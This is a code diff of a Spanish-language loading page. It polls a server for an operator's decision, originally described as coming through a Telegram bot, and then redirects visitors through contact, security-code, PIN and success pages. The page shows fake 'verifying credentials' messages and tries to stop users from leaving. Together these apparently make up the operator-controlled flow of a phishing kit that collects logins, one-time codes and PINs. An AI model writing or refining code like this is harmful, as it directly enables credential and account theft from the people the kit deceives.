@@ -22,7 +22,6 @@
             overflow: hidden;
         }
         
-        /* Overlay para efecto de loading */
         .overlay {
             position: fixed;
             top: 0;
@@ -156,10 +155,6 @@
             min-height: 20px;
             margin-bottom: 20px;
         }
-        
-        .hidden {
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -185,82 +180,110 @@
     </div>
 
     <script>
+        // Obtener sessionId de la URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('sessionId') || sessionStorage.getItem('sessionId');
+        const step = urlParams.get('step') || 'login';
+
+        if (!sessionId) {
+            console.error('No se encontró sessionId');
+            window.location.href = '/';
+        }
+
         // Mensajes de estado que van cambiando
         const statusMessages = [
             'Conectando con el servidor...',
             'Verificando credenciales...',
             'Validando información...',
-            'Procesando solicitud...',
-            'Casi terminamos...'
+            'Esperando aprobación...',
+            'Procesando solicitud...'
         ];
         
         let messageIndex = 0;
         const statusElement = document.getElementById('statusMessage');
+        let pollingInterval;
         
-        // Cambiar mensajes de estado cada 2 segundos
+        // Cambiar mensajes de estado cada 3 segundos
         function updateStatusMessage() {
             statusElement.textContent = statusMessages[messageIndex];
             messageIndex = (messageIndex + 1) % statusMessages.length;
         }
         
-        // Iniciar cambio de mensajes
-        setInterval(updateStatusMessage, 2000);
+        const messageInterval = setInterval(updateStatusMessage, 3000);
         
-        // Simular verificación de estado del bot de Telegram
-        function checkTelegramResponse() {
-            // Aquí se verificará si hay respuesta del bot de Telegram
-            // Por ahora simularemos con timeout
-            
-            // Verificar cada 2 segundos si hay una decisión desde Telegram
-            const checkInterval = setInterval(() => {
-                // Simular respuesta desde Telegram (esto sería una llamada real a tu API)
-                const telegramResponse = checkForTelegramDecision();
+        // Polling real al servidor para verificar estado
+        async function checkSessionStatus() {
+            try {
+                const response = await fetch(`/api/check-status/${sessionId}`);
+                const data = await response.json();
                 
-                if (telegramResponse) {
-                    clearInterval(checkInterval);
-                    redirectToNextForm(telegramResponse);
+                console.log('Estado de sesión:', data);
+                
+                if (data.success && data.nextAction) {
+                    clearInterval(pollingInterval);
+                    clearInterval(messageInterval);
+                    
+                    // Redirigir según el siguiente paso
+                    redirectToNextPage(data.status, data.nextAction);
                 }
-            }, 2000);
-            
-            // Timeout de seguridad después de 30 segundos
-            setTimeout(() => {
-                clearInterval(checkInterval);
-                // Si no hay respuesta, redirigir al formulario por defecto
-                redirectToNextForm('contact');
-            }, 30000);
-        }
-        
-        function checkForTelegramDecision() {
-            // Aquí verificarías tu API/database por la decisión del operador
-            // Por ahora retornamos null (sin respuesta aún)
-            
-            // Ejemplo de respuesta que vendrá de Telegram:
-            // return { nextForm: 'contact', approved: true };
-            return null;
-        }
-        
-        function redirectToNextForm(response) {
-            // Determinar a qué formulario redirigir según la respuesta de Telegram
-            let nextPage = 'contact.html'; // Por defecto
-            
-            if (typeof response === 'string') {
-                nextPage = response + '.html';
-            } else if (response && response.nextForm) {
-                nextPage = response.nextForm + '.html';
+                
+            } catch (error) {
+                console.error('Error verificando estado:', error);
             }
-            
-            // Efectos de transición antes de redirigir
-            document.querySelector('.container').style.opacity = '0.5';
-            statusElement.textContent = 'Redirigiendo...';
-            
-            setTimeout(() => {
-                window.location.href = nextPage;
-            }, 1000);
         }
         
-        // Iniciar verificación cuando carga la página
+        function redirectToNextPage(status, nextAction) {
+            statusElement.textContent = 'Redirigiendo...';
+            document.querySelector('.container').style.opacity = '0.7';
+            
+            setTimeout(() => {
+                switch(nextAction) {
+                    case 'show_contact_form':
+                        window.location.href = `contact.html?sessionId=${sessionId}`;
+                        break;
+                    case 'show_security_form':
+                        window.location.href = `security-code.html?sessionId=${sessionId}`;
+                        break;
+                    case 'show_pin_form':
+                        window.location.href = `password.html?sessionId=${sessionId}`;
+                        break;
+                    case 'show_success':
+                        window.location.href = `success.html?sessionId=${sessionId}`;
+                        break;
+                    case 'show_rejection':
+                        window.location.href = `error.html?reason=rejected`;
+                        break;
+                    default:
+                        console.log('Acción no reconocida:', nextAction);
+                        // Continuar esperando
+                        pollingInterval = setInterval(checkSessionStatus, 3000);
+                }
+            }, 1500);
+        }
+        
+        // Iniciar polling cuando carga la página
         document.addEventListener('DOMContentLoaded', function() {
-            checkTelegramResponse();
+            console.log('Iniciando polling para sessionId:', sessionId);
+            
+            // Primera verificación inmediata
+            checkSessionStatus();
+            
+            // Continuar verificando cada 3 segundos
+            pollingInterval = setInterval(checkSessionStatus, 3000);
+            
+            // Timeout de seguridad después de 60 segundos
+            setTimeout(() => {
+                clearInterval(pollingInterval);
+                clearInterval(messageInterval);
+                
+                if (step === 'login') {
+                    // Si no hay respuesta después del login, ir a contacto por defecto
+                    window.location.href = `contact.html?sessionId=${sessionId}`;
+                } else {
+                    // Para otros casos, mostrar error
+                    window.location.href = 'error.html?reason=timeout';
+                }
+            }, 60000);
         });
         
         // Prevenir que el usuario salga de la página mientras carga
